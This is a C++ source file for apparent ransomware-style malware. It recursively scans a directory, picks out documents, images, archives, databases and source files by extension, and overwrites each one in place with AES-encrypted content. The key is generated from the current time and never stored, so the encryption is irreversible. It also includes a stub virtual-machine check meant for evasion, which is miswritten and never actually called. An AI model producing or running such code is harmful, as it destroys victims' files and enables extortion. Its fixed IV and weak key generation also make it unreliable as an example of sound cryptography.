#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <iterator>
#include <stdint.h>
#include <iomanip>
#include <filesystem> 
#include <cstdlib>
#include <ctime> 
#include "include/plusaes.hpp"
#include "include/SHA256.hpp"

const std::vector<std::string> extensions = {
    ".doc", ".docx", ".odt", ".pdf", ".txt", ".rtf", ".tex", ".wps", ".xls", ".xlsx", 
    ".ods", ".csv", ".ppt", ".pptx", ".odp", ".jpg", ".jpeg", ".png", ".gif", ".bmp", 
    ".tiff", ".svg", ".mp3", ".wav", ".aac", ".flac", ".m4a", ".mp4", ".avi", ".mov", 
    ".wmv", ".mkv", ".flv", ".zip", ".rar", ".7z", ".tar", ".gz", ".bak", ".tmp", 
    ".old", ".db", ".sql", ".mdb", ".accdb", ".html", ".htm", ".css", ".js", ".py", 
    ".java", ".c", ".cpp", ".epub", ".mobi", ".azw", ".psd", ".ai"
};
std::vector<std::string> files;

std::string aes_keygen() {
    //Random key gen 
    std::srand(static_cast<unsigned int>(std::time(0)));
    char input[33];
    const char choices[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_+/";
    int i = 0;
    while ( i < 33 ){
        int index = rand() % (sizeof(choices) - 1);
        input[i] = choices[index];
        i++;
    }
    input[i] = '\0';
    // Random key generated

    SHA256 sha256; 
    std::vector<uint8_t> hash = sha256.hash(input);

    std::ostringstream oss;
    for (uint8_t byte : hash) {
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
    }
    return oss.str().substr(0, 32);
}

std::string base64_encode(const std::vector<unsigned char>& data) {
    static const char* base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    std::string encoded;
    int val = 0;
    int valb = -6;

    for (unsigned char c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    while (valb > -6) {
        encoded.push_back('=');
        valb -= 6;
    }

    return encoded;
}

std::string encryptor(const std::string& raw_data , std::string& key_str) {
    const std::vector<unsigned char> key(key_str.begin(), key_str.end());
    const unsigned char iv[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                                    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };
    const unsigned long encrypted_size = plusaes::get_padded_encrypted_size(raw_data.size());
    std::vector<unsigned char> encrypted(encrypted_size);
    
    plusaes::encrypt_cbc((unsigned char*)raw_data.data(), raw_data.size(), key.data(), key.size(), &iv, encrypted.data(), encrypted.size(), true);
    return base64_encode(encrypted);
}

bool encrypt(const std::string& file , std::string& key_str) {
    std::ifstream input(file, std::ios::binary);
    if (!input) {
        std::cerr << "Failed to open file: " << file << std::endl;
        return false;
    }

    std::string file_contents((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
    input.close();

    std::string encrypted_content = encryptor(file_contents , key_str);

    std::ofstream output(file, std::ios::binary | std::ios::trunc);
    if (!output) {
        std::cerr << "Failed to write to file: " << file << std::endl;
        return false;
    }

    output << encrypted_content;
    output.close();

    return true;
}

void directories(const std::string& file_path) {
    for (const auto& file : std::filesystem::recursive_directory_iterator(file_path)) {
        std::filesystem::path p1(file);
        if (std::find(extensions.begin(), extensions.end(), p1.extension()) != extensions.end()) {
            files.push_back(p1.string());
        }
    }
}

bool vm_check() {
#ifdef _WIN32
    return true;
#else
    return false;
#endif
}

int main() {
    if (!vm_check){
        return 1;
    }
    std::string path;
    std::cout << "Enter the directory path to scan for files: ";
    std::getline(std::cin, path);
    std::string key_str = aes_keygen();
    directories(path);
    for (const auto& file : files) {
        if (encrypt(file , key_str)) {
            std::cout << "Encrypted: " << file << "\n";
        } else {
            std::cerr << "Failed to encrypt: " << file << "\n";
        }
    }

    return 0;
}
